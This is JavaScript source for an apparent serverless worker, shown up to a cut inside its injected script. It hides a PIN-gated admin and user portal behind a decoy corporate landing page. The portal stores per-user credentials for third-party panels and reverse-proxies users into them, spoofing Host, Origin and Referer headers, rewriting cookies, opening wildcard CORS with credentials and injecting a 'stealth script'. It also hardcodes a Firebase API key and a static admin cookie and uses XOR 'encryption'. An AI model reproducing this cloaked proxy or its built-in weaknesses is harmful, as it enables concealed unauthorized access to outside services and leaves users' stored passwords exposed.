// ==========================================
// ⚙️ SECURE FIREBASE CONFIGURATION
// ==========================================
const CONFIG = {
    SESSION_SECRET: "nexus_enterprise_secure_tunnel_2026",
    FB_URL: "https://private-panel-916b4-default-rtdb.firebaseio.com",
    FB_KEY: "AIzaSyC5Ygv7umkM3LJ9XEDJUTcrn_DmJ19eY0c",
    DB_NODE: "admin_web"
};

// ==========================================
// 🔐 ADVANCED CRYPTO ENGINE (Unicode Safe)
// ==========================================
const encrypt = (text) => {
    let res = '';
    const utf8 = unescape(encodeURIComponent(text));
    for(let i=0; i<utf8.length; i++) res += String.fromCharCode(utf8.charCodeAt(i) ^ CONFIG.SESSION_SECRET.charCodeAt(i % CONFIG.SESSION_SECRET.length));
    return btoa(res);
};
const decrypt = (b64) => {
    try {
        let utf8 = atob(b64);
        let res = '';
        for(let i=0; i<utf8.length; i++) res += String.fromCharCode(utf8.charCodeAt(i) ^ CONFIG.SESSION_SECRET.charCodeAt(i % CONFIG.SESSION_SECRET.length));
        return decodeURIComponent(escape(res));
    } catch(e) { return null; }
};

// ==========================================
// 🎨 UI: MASSIVE REALISTIC DECOY LANDING PAGE
// ==========================================
const landingPageHTML = `
<!DOCTYPE html>
<html lang="en" class="dark">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Nexus Digital | Enterprise Solutions</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        body { background-color: #050505; color: white; font-family: 'Inter', sans-serif; overflow-x: hidden; scroll-behavior: smooth;}
        .loader { border: 2px solid transparent; border-top-color: #000; border-radius: 50%; width: 14px; height: 14px; animation: spin 1s linear infinite; }
        @keyframes spin { 100% { transform: rotate(360deg); } }
        input:focus { outline: none; box-shadow: none; }
        .feature-box { border: 1px solid rgba(255,255,255,0.05); background: rgba(255,255,255,0.01); transition: all 0.3s; }
        .feature-box:hover { background: rgba(255,255,255,0.03); border-color: rgba(255,255,255,0.15); transform: translateY(-3px); }
    </style>
</head>
<body class="antialiased selection:bg-white selection:text-black">
    <nav class="fixed w-full z-50 border-b border-white/10 bg-[#050505]/90 backdrop-blur-md">
        <div class="max-w-7xl mx-auto px-6 py-4 flex justify-between items-center">
            <div class="text-xl font-bold tracking-widest uppercase cursor-default select-none flex items-center gap-2">
                <svg class="w-6 h-6 text-indigo-500" fill="currentColor" viewBox="0 0 24 24"><path d="M12 2L2 7l10 5 10-5-10-5zM2 17l10 5 10-5M2 12l10 5 10-5"></path></svg>
                Nexus<span class="text-gray-500">.</span>
            </div>
            <div class="hidden md:flex gap-8 text-[10px] font-bold tracking-widest uppercase text-gray-400">
                <a href="#services" class="hover:text-white transition">Solutions</a>
                <a href="#pricing" class="hover:text-white transition">Pricing</a>
                <a href="#testimonials" class="hover:text-white transition">Customers</a>
                <a href="#resources" class="hover:text-white transition">Resources</a>
            </div>
            <button class="px-5 py-2.5 text-[10px] font-bold uppercase tracking-widest bg-white text-black hover:bg-gray-200 transition">Client Login</button>
        </div>
    </nav>

    <!-- Hero Section -->
    <header class="relative pt-32 pb-20 md:pt-48 md:pb-24 px-4 flex flex-col items-center justify-center border-b border-white/5">
        <div class="absolute top-1/4 left-1/2 -translate-x-1/2 w-3/4 h-1/2 bg-indigo-900/10 blur-[120px] rounded-full pointer-events-none"></div>
        <div class="text-center z-10 w-full max-w-2xl mx-auto">
            <span class="text-[10px] font-bold tracking-widest uppercase text-indigo-400 border border-indigo-500/30 bg-indigo-500/10 px-3 py-1 rounded-full mb-6 inline-block">Enterprise Data Registry V4.2</span>
            <h1 class="text-5xl md:text-7xl font-light tracking-tight mb-4">Secure <span class="font-bold text-white">Assets</span></h1>
            <p class="text-gray-400 text-sm md:text-base tracking-wide mb-10 leading-relaxed">Search our global registry of digital projects, infrastructure documentation, and cloud services.</p>
            
            <form id="search-form" class="w-full flex items-center p-1.5 border border-white/10 bg-[#0a0a0a] focus-within:border-indigo-500/50 transition-all shadow-[0_0_30px_rgba(0,0,0,0.5)]">
                <div class="pl-4 flex items-center justify-center pointer-events-none">
                    <svg id="search-icon" class="w-4 h-4 text-gray-500" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M21 21l-6-6m2-5a7 7 0 11-14 0 7 7 0 0114 0z"></path></svg>
                </div>
                <input type="text" id="main-search" placeholder="Search by project ID, service or keyword..." autocomplete="off" spellcheck="false"
                    class="w-full bg-transparent text-white text-sm px-4 py-3 placeholder-gray-600 tracking-wide font-medium">
                <button type="submit" id="search-btn" class="px-6 py-3 bg-white hover:bg-gray-200 text-black text-[10px] font-bold uppercase tracking-widest transition flex items-center justify-center min-w-[100px]">
                    <span id="btn-text">Lookup</span><div id="search-spinner" class="loader hidden"></div>
                </button>
            </form>
            <p id="search-msg" class="text-[10px] font-bold text-gray-500 mt-4 tracking-widest uppercase opacity-0 transition-opacity h-4"></p>
        </div>
    </header>

    <div class="w-full border-b border-white/5 bg-[#080808]">
        <div class="max-w-5xl mx-auto grid grid-cols-2 md:grid-cols-4 gap-4 py-12 px-6 text-center">
            <div><p class="text-3xl font-bold text-white mb-1">99.99%</p><p class="text-[9px] text-gray-500 uppercase tracking-widest">Uptime SLA</p></div>
            <div><p class="text-3xl font-bold text-white mb-1">200+</p><p class="text-[9px] text-gray-500 uppercase tracking-widest">Edge Datacenters</p></div>
            <div><p class="text-3xl font-bold text-white mb-1">&lt;12ms</p><p class="text-[9px] text-gray-500 uppercase tracking-widest">Global Latency</p></div>
            <div><p class="text-3xl font-bold text-white mb-1">AES-GCM</p><p class="text-[9px] text-gray-500 uppercase tracking-widest">256-bit Encrypted</p></div>
        </div>
    </div>

    <footer class="pt-20 pb-10 px-6 bg-[#030303] border-t border-white/5">
        <div class="max-w-7xl mx-auto flex flex-col items-center">
            <p class="text-[10px] text-gray-600 uppercase tracking-widest">&copy; 2026 Nexus Digital Enterprise. All rights reserved.</p>
        </div>
    </footer>

    <script>
        document.getElementById('search-form').addEventListener('submit', async (e) => {
            e.preventDefault();
            const q = document.getElementById('main-search').value.trim();
            if(!q) return;
            document.getElementById('btn-text').classList.add('hidden');
            document.getElementById('search-spinner').classList.remove('hidden');
            document.getElementById('main-search').disabled = true;
            try {
                const res = await fetch('/api/access', { method: 'POST', body: JSON.stringify({ code: q }) });
                if (res.ok) {
                    const data = await res.json();
                    document.getElementById('search-msg').style.color = '#4ade80'; 
                    document.getElementById('search-msg').innerText = 'NODE IDENTIFIED. CONNECTING...';
                    document.getElementById('search-msg').style.opacity = '1';
                    setTimeout(() => window.location.href = data.role === 'admin' ? '/admin' : '/dashboard', 800);
                } else {
                    setTimeout(() => {
                        document.getElementById('btn-text').classList.remove('hidden');
                        document.getElementById('search-spinner').classList.add('hidden');
                        document.getElementById('main-search').disabled = false;
                        document.getElementById('main-search').value = '';
                        document.getElementById('search-msg').style.color = '#ef4444'; 
                        document.getElementById('search-msg').innerText = 'NO RESULTS FOUND FOR "' + q.toUpperCase() + '"';
                        document.getElementById('search-msg').style.opacity = '1';
                    }, 1000);
                }
            } catch (err) {}
        });
    </script>
</body>
</html>
`;

// ==========================================
// 🚀 BACKEND & CORE LOGIC
// ==========================================
export default {
    async fetch(request, env, ctx) {
        const url = new URL(request.url);
        const path = url.pathname;

        const cookies = Object.fromEntries((request.headers.get("Cookie") || "").split(';').map(c => {
            const parts = c.split('='); return[parts[0].trim(), parts.slice(1).join('=')];
        }));

        const getDB = async () => {
            try {
                const res = await fetch(`${CONFIG.FB_URL}/${CONFIG.DB_NODE}.json?key=${CONFIG.FB_KEY}`);
                let data = await res.json();
                if (!data) {
                    data = { adminPin: "SET_YOUR_PIN_HERE", settings: { whatsapp: "", notification: { enabled: false, target: "all", specificUsers:[], text: "", image: "", btnText: "", btnLink: "" } }, sites: {}, pins: {} };
                    await fetch(`${CONFIG.FB_URL}/${CONFIG.DB_NODE}.json?key=${CONFIG.FB_KEY}`, { method: 'PUT', body: JSON.stringify(data) });
                }
                return data;
            } catch(e) { return null; }
        };
        const updateDB = async (data) => {
            await fetch(`${CONFIG.FB_URL}/${CONFIG.DB_NODE}.json?key=${CONFIG.FB_KEY}`, { method: 'PUT', body: JSON.stringify(data) });
        };

        let db = await getDB() || {};
        if (!db.sites) db.sites = {};
        if (!db.pins) db.pins = {};
        if (!db.settings) db.settings = { whatsapp: "", notification: { enabled: false, target: "all", specificUsers:[], text: "", image: "", btnText: "", btnLink: "" } };

        const isAdmin = cookies['admin_session'] === CONFIG.SESSION_SECRET;
        const userPin = cookies['portal_session'];
        const isUser = !!(userPin && db.pins && db.pins[userPin]);
        let isProxyActive = cookies['proxy_active'];

        const destHeader = request.headers.get("Sec-Fetch-Dest") || "";
        const acceptHeader = request.headers.get("Accept") || "";
        const isMainDocument = destHeader === "document" || acceptHeader.includes("text/html");

        if (isProxyActive && request.method === "GET" && !path.startsWith("/api/") && !path.startsWith("/__api_proxy") && isMainDocument) {
            const secFetchSite = request.headers.get("Sec-Fetch-Site");
            const referer = request.headers.get("Referer");
            if (secFetchSite === "none" || (!secFetchSite && !referer)) {
                return new Response("Killed", { status: 302, headers: { "Location": "/", "Set-Cookie": "proxy_active=; Max-Age=0; Path=/" } });
            }
        }

        // --- 📡 API INTERCEPTOR PROXY WITH CORS PREFLIGHT FIX ---
        if (path === "/__api_proxy") {
            // ✅ Handle CORS Preflight for API logins like liveapi247.live
            if (request.method === "OPTIONS") {
                return new Response(null, {
                    status: 204,
                    headers: {
                        "Access-Control-Allow-Origin": "*",
                        "Access-Control-Allow-Methods": "GET, POST, PUT, PATCH, DELETE, OPTIONS",
                        "Access-Control-Allow-Headers": request.headers.get("Access-Control-Request-Headers") || "Content-Type, Authorization, X-Requested-With, Accept",
                        "Access-Control-Allow-Credentials": "true"
                    }
                });
            }

            const targetUrlStr = url.searchParams.get("target");
            if(!targetUrlStr) return new Response("Bad Target", {status:400});
            
            const tObj = new URL(targetUrlStr);
            const proxyHeaders = new Headers(request.headers);
            proxyHeaders.set("Host", tObj.hostname);
            proxyHeaders.set("Origin", tObj.origin);
            proxyHeaders.set("Referer", tObj.origin + "/");
            proxyHeaders.delete("Accept-Encoding");
            
            const cleanCookieStr = Object.entries(cookies).filter(([k]) => k !== 'portal_session' && k !== 'proxy_active').map(([k,v]) => `${k}=${v}`).join('; ');
            if (cleanCookieStr) proxyHeaders.set("Cookie", cleanCookieStr); else proxyHeaders.delete("Cookie");

            const fetchConfig = { method: request.method, headers: proxyHeaders, redirect: "manual" };
            if (["POST", "PUT", "PATCH", "DELETE"].includes(request.method)) fetchConfig.body = request.body;

            const proxyRes = await fetch(targetUrlStr, fetchConfig);
            const responseHeaders = new Headers(proxyRes.headers);
            
            responseHeaders.set("Access-Control-Allow-Origin", "*");
            responseHeaders.set("Access-Control-Allow-Credentials", "true");
            responseHeaders.set("Access-Control-Expose-Headers", "*"); 

            return new Response(proxyRes.body, { status: proxyRes.status, statusText: proxyRes.statusText, headers: responseHeaders });
        }

        if (path === "/api/access" && request.method === "POST") {
            const { code } = await request.json();
            if (db.adminPin && db.adminPin !== "SET_YOUR_PIN_HERE" && code === String(db.adminPin)) {
                return new Response(JSON.stringify({ success: true, role: 'admin' }), { headers: { "Set-Cookie": `admin_session=${CONFIG.SESSION_SECRET}; HttpOnly; Secure; Path=/` } });
            }
            if (db.pins && db.pins[code]) {
                return new Response(JSON.stringify({ success: true, role: 'user' }), { headers: { "Set-Cookie": `portal_session=${code}; HttpOnly; Secure; Path=/` } });
            }
            return new Response("Invalid", { status: 401 });
        }

        if (path === "/api/update-password" && request.method === "POST") {
            if (!isUser) return new Response("Denied", { status: 403 });
            const { siteId, newPassword } = await request.json();
            if (!db.pins[userPin].siteConf) db.pins[userPin].siteConf = {};
            if (!db.pins[userPin].siteConf[siteId]) db.pins[userPin].siteConf[siteId] = {u:'', r:'Admin', p:''};
            db.pins[userPin].siteConf[siteId].p = newPassword;
            await updateDB(db);
            return new Response(JSON.stringify({ success: true }));
        }

        if (path === "/logout" || path === "/api/stop-proxy") {
            return new Response("Logged out", { status: 302, headers: { "Location": "/", "Set-Cookie": "proxy_active=; Max-Age=0; Path=/" } });
        }

        // --- 🛠️ COMMON MODAL TEMPLATE (SQUARE) ---
        const customModalScript = `
        <div id="c-modal" class="hidden fixed inset-0 z-[100] flex items-center justify-center bg-black/80 backdrop-blur-md">
            <div class="bg-[#0a0a0a] border border-white/10 p-6 max-w-sm w-full mx-4 shadow-2xl flex flex-col">
                <h3 id="cm-title" class="text-white font-bold tracking-widest mb-3 uppercase text-sm flex items-center gap-2"></h3>
                <p id="cm-text" class="text-gray-400 text-xs mb-6 leading-relaxed"></p>
                <input type="text" id="cm-input" class="hidden w-full bg-black border border-white/10 p-3 text-xs mb-5 outline-none focus:border-indigo-500 text-white" autocomplete="off">
                <div class="flex gap-3 justify-end">
                    <button id="cm-cancel" class="hidden px-5 py-2.5 bg-white/5 hover:bg-white/10 text-gray-300 text-[10px] font-bold uppercase tracking-widest transition border border-white/5">Cancel</button>
                    <button id="cm-confirm" class="px-6 py-2.5 bg-indigo-600 text-white hover:bg-indigo-500 text-[10px] font-bold uppercase tracking-widest transition shadow-[0_0_15px_rgba(99,102,241,0.4)]">Confirm</button>
                </div>
            </div>
        </div>
        <script>
            const CustomModal = {
                show: function({ type, title, text, placeholder, onConfirm }) {
                    const m = document.getElementById('c-modal'), tTitle = document.getElementById('cm-title'), tText = document.getElementById('cm-text');
                    const inp = document.getElementById('cm-input'), bCan = document.getElementById('cm-cancel'), bCon = document.getElementById('cm-confirm');
                    tTitle.innerHTML = title; tText.innerHTML = text;
                    inp.value = ''; inp.placeholder = placeholder || '';
                    inp.classList.add('hidden'); bCan.classList.add('hidden');
                    if(type === 'prompt') { inp.classList.remove('hidden'); bCan.classList.remove('hidden'); setTimeout(()=>inp.focus(),100); }
                    else if(type === 'confirm') { bCan.classList.remove('hidden'); }
                    m.classList.remove('hidden');
                    bCan.onclick = () => { m.classList.add('hidden'); if(type==='prompt') onConfirm(null); else onConfirm(false); };
                    bCon.onclick = () => { m.classList.add('hidden'); if(type==='prompt') onConfirm(inp.value.trim()); else onConfirm(true); };
                    inp.onkeypress = (e) => { if(e.key === 'Enter') bCon.click(); };
                }
            };
        </script>`;

        // --- 🛠️ ADMIN PANEL ---
        if (path.startsWith("/admin")) {
            if (!isAdmin) return Response.redirect(url.origin, 302);
            if (path === "/admin/api/data") return new Response(JSON.stringify(db));
            if (path === "/admin/api/save" && request.method === "POST") {
                const newData = await request.json();
                await updateDB(newData);
                return new Response("Saved");
            }

            const adminHTML = `<!DOCTYPE html><html lang="en" class="dark">
            <head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>Admin Portal</title><script src="https://cdn.tailwindcss.com"></script>
            <style>
                body { background-color: #030303; color: white; font-family: 'Inter', sans-serif; } 
                .square-card { background: #0a0a0a; border: 1px solid rgba(255,255,255,0.05); } 
                .active-tab { border-b-2 border-indigo-400; color: white; }
                .square-select { appearance: none; border-radius: 0; background: #000; border: 1px solid rgba(255,255,255,0.2); outline: none; cursor: pointer; }
            </style>
            </head>
            <body class="pb-28">
                ${customModalScript}
                <header class="sticky top-0 z-40 flex justify-between items-center border-b border-white/10 bg-[#0a0a0a] p-4 md:p-6 shadow-md w-full">
                    <div><h1 class="text-lg md:text-xl font-bold tracking-widest uppercase text-indigo-400">Master <span class="text-white">Admin</span></h1></div>
                    <a href="/logout" class="px-5 py-2.5 bg-red-900/20 text-[10px] font-bold tracking-widest uppercase border border-red-900/50 text-red-500 hover:bg-red-600 hover:text-white transition">Logout</a>
                </header>
                <div class="max-w-6xl mx-auto p-4 md:p-8" id="app">
                    <div class="flex justify-center items-center h-40"><div class="animate-spin w-8 h-8 border-2 border-indigo-500 border-t-transparent rounded-full"></div></div>
                </div>
                <div class="fixed bottom-0 left-0 w-full bg-[#050505] border-t border-white/10 p-4 z-50 flex justify-center backdrop-blur-md">
                    <button id="save-btn" onclick="save()" class="w-full max-w-sm bg-white text-black font-bold uppercase tracking-widest py-4 hover:bg-gray-200 transition shadow-[0_0_20px_rgba(255,255,255,0.2)]">SAVE ALL CHANGES</button>
                </div>
                <script>
                    let db = {}; let tab = 'pins'; let openPins = new Set(); let searchQuery = '';
                    async function load(){ const res = await fetch('/admin/api/data'); db = await res.json(); render(); }
                    async function save(){ 
                        document.getElementById('save-btn').innerText = 'SAVING...';
                        await fetch('/admin/api/save', {method:'POST', body:JSON.stringify(db)}); 
                        setTimeout(() => { document.getElementById('save-btn').innerText = 'SAVE ALL CHANGES'; CustomModal.show({type:'alert', title:'<span class="text-green-500">✔</span> Success', text:'Database Successfully Updated!'}); }, 500);
                    }
                    function uPinSt(pin, val) { db.pins[pin].status = val; render(); }
                    function uPinF(pin, field, val) { db.pins[pin][field] = val; }
                    function uSiteF(id, f, val) { db.sites[id][f] = val; }
                    function uSet(f, val) { db.settings[f] = val; }
                    function toggleSite(pin, siteId, chk) {
                        let list = db.pins[pin].sites ||[];
                        if(!db.pins[pin].siteConf) db.pins[pin].siteConf = {};
                        if(chk && !list.includes(siteId)) { list.push(siteId); db.pins[pin].siteConf[siteId] = {u:'', r:'Admin', p:''}; } 
                        else if(!chk) { list = list.filter(i => i !== siteId); delete db.pins[pin].siteConf[siteId]; }
                        db.pins[pin].sites = list; render();
                    }
                    function uPinSiteConf(pin, siteId, field, val) {
                        if(!db.pins[pin].siteConf) db.pins[pin].siteConf = {};
                        if(!db.pins[pin].siteConf[siteId]) db.pins[pin].siteConf[siteId] = {u:'', r:'Admin', p:''};
                        db.pins[pin].siteConf[siteId][field] = val;
                    }
                    function addSite() { db.sites['s_'+Date.now()] = {name:'', agentLink:'', userLink:'', apiLink:''}; tab='sites'; render(); }
                    function addPin() { 
                        CustomModal.show({type:'prompt', title:'New User', text:'Enter User Name:', onConfirm: (name) => {
                            if(!name) return;
                            CustomModal.show({type:'prompt', title:'Set PIN', text:'Enter Secret PIN:', onConfirm: (p) => {
                                if(p && !db.pins[p]){ db.pins[p] = { name: name, status:'active', sites:[], siteConf:{} }; openPins.add(p); tab='pins'; render(); } 
                            }});
                        }});
                    }
                    function delSite(id) { CustomModal.show({type:'confirm', title:'<span class="text-red-500">⚠</span> Delete Site', text:'Are you sure?', onConfirm: (yes) => { if(yes) { delete db.sites[id]; render(); } }}); }
                    function delPin(pin) { CustomModal.show({type:'confirm', title:'<span class="text-red-500">⚠</span> Delete User', text:'Are you sure?', onConfirm: (yes) => { if(yes) { delete db.pins[pin]; render(); } }}); }
                    function toggleAdminPin(pin) { if(openPins.has(pin)) openPins.delete(pin); else openPins.add(pin); render(); }
                    function render() {
                        if(!db.sites) db.sites = {}; if(!db.pins) db.pins = {}; if(!db.settings) db.settings = {whatsapp:'', notification:{enabled:false, target:'all', specificUsers:[]}};
                        let html = \`<div class="flex gap-6 mb-8 border-b border-white/10 px-2 overflow-x-auto custom-scrollbar"><button onclick="tab='pins'; render()" class="pb-3 text-xs font-bold uppercase \${tab==='pins'?'active-tab':'text-gray-500'}">User Pins</button><button onclick="tab='sites'; render()" class="pb-3 text-xs font-bold uppercase \${tab==='sites'?'active-tab':'text-gray-500'}">Global Sites</button></div>\`;
                        if(tab === 'pins') {
                            html += \`<div class="flex flex-col md:flex-row justify-between mb-6 gap-4"><input type="text" placeholder="Search..." oninput="searchQuery=this.value.toLowerCase(); render()" class="w-full bg-black border border-white/10 p-3 text-xs text-white focus:border-indigo-500"><button onclick="addPin()" class="bg-indigo-600/20 text-indigo-400 px-5 py-3 text-[10px] font-bold uppercase hover:bg-indigo-600 hover:text-white transition">+ Add New User</button></div><div class="grid grid-cols-1 md:grid-cols-2 gap-5">\`;
                            Object.keys(db.pins).forEach(pin => {
                                let pData = db.pins[pin]; let isOpen = openPins.has(pin);
                                html += \`<div class="square-card flex flex-col"><div class="flex justify-between p-5 cursor-pointer" onclick="toggleAdminPin('\${pin}')"><div><span class="text-lg font-bold text-white">\${pData.name}</span><span class="block text-[10px] text-indigo-400 mt-1">PIN: \${pin}</span></div></div><div class="\${isOpen?'block':'hidden'} p-5 border-t border-white/5 bg-black/40"><div class="space-y-3">\`;
                                        Object.keys(db.sites).forEach(siteId => {
                                            let hasSite = (pData.sites||[]).includes(siteId); let conf = pData.siteConf?.[siteId] || {u:'', r:'Admin', p:''};
                                            html += \`<div class="bg-[#0a0a0a] border border-white/10 p-3"><label class="flex items-center gap-3"><input type="checkbox" \${hasSite?'checked':''} onchange="toggleSite('\${pin}', '\${siteId}', this.checked)"> <span class="text-gray-300 font-bold">\${db.sites[siteId].name||'Unnamed'}</span></label>\`;
                                            if(hasSite) {
                                                html += \`<div class="mt-3 space-y-2 pl-6"><input value="\${conf.u}" oninput="uPinSiteConf('\${pin}','\${siteId}','u',this.value)" placeholder="Username" class="w-full bg-black p-2 text-xs text-white"><input value="\${conf.p||''}" oninput="uPinSiteConf('\${pin}','\${siteId}','p',this.value)" placeholder="Password" class="w-full bg-black p-2 text-xs text-white"></div>\`;
                                            }
                                            html += \`</div>\`;
                                        });
                                    html += \`</div><button onclick="delPin('\${pin}')" class="mt-5 w-full py-2 bg-red-900/20 text-red-500 text-[10px] font-bold uppercase">Delete User</button></div></div>\`;
                            });
                            html += \`</div>\`;
                        } else if(tab === 'sites') {
                            html += \`<div class="flex justify-between mb-6"><h3 class="text-[10px] text-gray-500 uppercase font-bold">Websites</h3><button onclick="addSite()" class="bg-indigo-600/20 text-indigo-400 px-4 py-2 text-[10px] font-bold uppercase">+ Add Site</button></div><div class="grid grid-cols-1 md:grid-cols-2 gap-5">\`;
                            Object.keys(db.sites).forEach(id => {
                                html += \`<div class="square-card p-5"><input value="\${db.sites[id].name}" oninput="uSiteF('\${id}','name',this.value)" placeholder="Site Name" class="w-full bg-transparent text-xl font-bold text-white border-b border-white/10 pb-1 mb-4"><input value="\${db.sites[id].agentLink}" oninput="uSiteF('\${id}','agentLink',this.value)" placeholder="Agent Link" class="w-full bg-black/50 p-2 text-xs text-green-400 mb-3"><input value="\${db.sites[id].userLink}" oninput="uSiteF('\${id}','userLink',this.value)" placeholder="User Link" class="w-full bg-black/50 p-2 text-xs text-blue-400 mb-3"><input value="\${db.sites[id].apiLink||''}" oninput="uSiteF('\${id}','apiLink',this.value)" placeholder="API Link (e.g. https://liveapi247.live)" class="w-full bg-black/50 p-2 text-xs text-purple-400 mb-5"><button onclick="delSite('\${id}')" class="w-full py-2 bg-red-900/20 text-red-500 text-[10px] font-bold uppercase">Delete Site</button></div>\`;
                            });
                            html += \`</div>\`;
                        }
                        document.getElementById('app').innerHTML = html;
                    }
                    load();
                </script>
            </body>
            </html>`;
            return new Response(adminHTML, { headers: { "Content-Type": "text/html" } });
        }

        // --- 💻 USER DASHBOARD ---
        if (path === "/dashboard") {
            if (!isUser) return Response.redirect(url.origin, 302);
            const userData = db.pins[userPin];
            let sitesHTML = '';

            if (userData.sites && userData.sites.length > 0) {
                userData.sites.forEach(siteId => {
                    const site = db.sites[siteId];
                    if (!site) return;
                    const siteConf = userData.siteConf?.[siteId] || { u: '', r: 'Admin', p: '' };
                    const hasPwd = siteConf.p && siteConf.p.trim() !== '';
                    const safeSiteName = (site.name || 'this site').replace(/'/g, "\\'").replace(/"/g, '&quot;');
                    
                    const loginAction = hasPwd ? `window.location.href='/api/start-proxy?id=${siteId}'` : `CustomModal.show({type:'alert', title:'<span class=\\'text-red-500\\'>⚠</span> Error', text:'Please set password first.'})`;

                    sitesHTML += `
                    <div class="border border-white/5 bg-[#0a0a0a] p-5">
                        <div class="flex justify-between items-start mb-4"><span class="text-[8px] font-bold uppercase px-2 py-1 border text-purple-400 border-purple-400/20 bg-purple-400/10">Active</span></div>
                        <h2 class="text-xl font-bold text-white tracking-wide truncate mb-3">${site.name || 'Unnamed Site'}</h2>
                        <div class="mt-3 space-y-2 p-3 bg-black/40 border border-white/5">
                            <div class="bg-white/5 border border-white/10 flex items-center p-1.5"><span class="text-[8px] font-bold text-gray-500 uppercase px-2 w-[60px]">User</span><input type="text" readonly value="${siteConf.u}" class="flex-grow bg-transparent text-[11px] text-white px-2 outline-none"></div>
                            <div class="bg-white/5 border border-white/10 flex items-center p-1.5 mt-2"><span class="text-[8px] font-bold text-gray-500 uppercase px-2 w-[60px]">Pass</span><input type="text" readonly value="${siteConf.p || ''}" id="pwd-in-${siteId}" class="flex-grow bg-transparent text-[11px] text-white px-2 outline-none focus:border-indigo-500" style="-webkit-text-security: disc;"><button onclick="savePwd('${siteId}')" class="h-7 px-3 bg-indigo-500/20 text-indigo-400 text-[8px] font-bold uppercase">Update</button></div>
                        </div>
                        <button onclick="${loginAction}" class="w-full py-4 bg-white text-black text-[10px] font-bold uppercase tracking-[0.2em] hover:bg-gray-200 transition-colors mt-4">Login Your Panel</button>
                    </div>`;
                });
            }

            const html = `<!DOCTYPE html><html lang="en" class="dark"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>Core | Portal</title><script src="https://cdn.tailwindcss.com"></script><style>body { background-color: #030303; color: white; }</style></head>
            <body class="pb-20">
                ${customModalScript}
                <header class="flex justify-between items-center border-b border-white/10 bg-[#0a0a0a] p-6">
                    <div><h1 class="text-xl font-bold text-indigo-400">Welcome <span class="text-white">${userData.name || userPin}</span></h1></div>
                    <a href="/logout" class="px-5 py-2.5 bg-red-900/20 text-[10px] font-bold text-red-500">Terminate</a>
                </header>
                <div class="max-w-6xl mx-auto p-4 md:p-8"><div class="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-5">${sitesHTML}</div></div>
                <script>
                    async function savePwd(siteId) {
                        const pwd = document.getElementById('pwd-in-' + siteId).value;
                        if(!pwd) return;
                        try {
                            const res = await fetch('/api/update-password', { method: 'POST', body: JSON.stringify({ siteId, newPassword: pwd }) });
                            if(res.ok) CustomModal.show({type:'alert', title:'<span class="text-green-500">✔</span> Success', text:'Password Updated!'});
                        } catch(e) {}
                    }
                </script>
            </body></html>`;
            return new Response(html, { headers: { "Content-Type": "text/html" } });
        }

        // --- 🚀 PROXY START ---
        if (path === "/api/start-proxy") {
            if (!isUser) return new Response("Denied", { status: 403 });
            const siteId = url.searchParams.get("id");
            const userData = db.pins[userPin];
            if (!userData.sites.includes(siteId) || !db.sites[siteId]) return new Response("Access Denied", { status: 403 });
            
            const conf = userData.siteConf?.[siteId] || {};
            const proxyData = JSON.stringify({ t: db.sites[siteId].agentLink, a: db.sites[siteId].apiLink || '', u: conf.u || '', p: conf.p || '' });
            return new Response("Starting...", { status: 302, headers: { "Location": "/", "Set-Cookie": `proxy_active=${encrypt(proxyData)}; HttpOnly; Secure; Path=/; Max-Age=3600; SameSite=Lax` } });
        }

        // --- 🌐 GLOBAL PROXY ENGINE ---
        if (isUser && isProxyActive) {
            const proxyDataString = decrypt(isProxyActive);
            if(!proxyDataString) return new Response("Invalid Proxy", { status: 400 });
            
            let proxyData;
            try { proxyData = JSON.parse(proxyDataString); } catch(e) { proxyData = { t: proxyDataString, a: '', u: '', p: '' }; }

            const targetDomain = proxyData.t;
            const autoApi = proxyData.a;
            const autoUser = proxyData.u;
            const autoPwd = proxyData.p;

            const targetUrl = new URL(request.url);
            const tDomainObj = new URL(targetDomain);
            targetUrl.hostname = tDomainObj.hostname;
            targetUrl.protocol = tDomainObj.protocol;
            targetUrl.port = tDomainObj.port;

            // 🚀 WEBSOCKET UPGRADE HANDLER
            if (request.headers.get("Upgrade") === "websocket") {
                const wsUrl = new URL(request.url);
                wsUrl.hostname = tDomainObj.hostname;
                wsUrl.protocol = tDomainObj.protocol === 'https:' ? 'wss:' : 'ws:';
                const wsHeaders = new Headers(request.headers);
                wsHeaders.set("Host", tDomainObj.hostname);
                wsHeaders.set("Origin", targetDomain);
                return fetch(new Request(wsUrl.toString(), request), { headers: wsHeaders });
            }

            const proxyHeaders = new Headers(request.headers);
            proxyHeaders.set("Host", targetUrl.hostname);
            proxyHeaders.set("Origin", targetDomain);
            proxyHeaders.set("Referer", targetDomain + targetUrl.pathname);
            proxyHeaders.delete("Accept-Encoding"); 

            delete cookies['portal_session'];
            delete cookies['proxy_active'];
            const cleanCookieStr = Object.entries(cookies).map(([k, v]) => `${k}=${v}`).join('; ');
            if (cleanCookieStr) proxyHeaders.set("Cookie", cleanCookieStr); else proxyHeaders.delete("Cookie");

            const fetchConfig = { method: request.method, headers: proxyHeaders, redirect: "manual" };
            if (["POST", "PUT", "PATCH", "DELETE"].includes(request.method)) fetchConfig.body = request.body;

            const proxyRes = await fetch(targetUrl.toString(), fetchConfig);
            const responseHeaders = new Headers();
            
            for (const[key, value] of proxyRes.headers.entries()) {
                if (key.toLowerCase() === 'set-cookie') {
                    let modCookie = value.replace(/Domain=[^;]+;?\s*/gi, '');
                    responseHeaders.append('Set-Cookie', modCookie);
                } else {
                    responseHeaders.append(key, value);
                }
            }

            const locationHeader = responseHeaders.get("Location");
            if (locationHeader) responseHeaders.set("Location", locationHeader.replace(targetDomain, url.origin));
            responseHeaders.append("Set-Cookie", `proxy_active=${isProxyActive}; HttpOnly; Secure; Path=/; Max-Age=3600; SameSite=Lax`);

            let body = proxyRes.body;
            const contentType = responseHeaders.get("Content-Type") || "";
            
            if (contentType.includes("text/html")) {
                let htmlText = await proxyRes.text();
                htmlText = htmlText.split(targetDomain).join(url.origin);
                
                const encTargetTrim = encrypt(targetDomain).substring(0,8);
                
                // 🔥 ADVANCED STEALTH SCRIPT WITH CUSTOM UI & REFRESH FIX
                const stealthScript = `<script>
(function(){
    try{
        // ✅ 1. FIXED REFRESH (F5) REDIRECT TO HOME
        var p = performance.getEntriesByType("navigation")[0];
        if (p && p.type === "reload") {
            window.location.replace("/api/stop-proxy");
            return;
